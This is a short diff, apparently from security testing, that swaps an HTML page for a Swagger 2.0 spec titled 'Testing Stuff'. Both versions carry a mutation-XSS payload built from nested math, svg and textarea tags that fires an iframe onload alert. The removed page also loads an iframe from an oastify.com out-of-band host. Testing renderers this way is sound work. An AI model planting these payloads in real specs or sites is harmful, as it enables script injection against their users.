@@ -1,6 +1,11 @@
-<html>
-    <body>
-        '<math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload=alert(document.domain)>"></a></textarea></mtext></svg></mglyph></table></mi></math>'
-
-<iframe src="http://w30a34tuqfnb47uiafiuwmdgh7nxbm.oastify.com/abcd.png" onerror=alert("Yes XSS Works") width="500" height="500"></iframe>
-    </body></html>
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Testing Stuff
+  description: '<math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload=alert(document.domain)>"></a></textarea></mtext></svg></mglyph></table></mi></math>'
+paths:
+  /:
+    get:
+      responses:
+        '200':
+          description: Hello
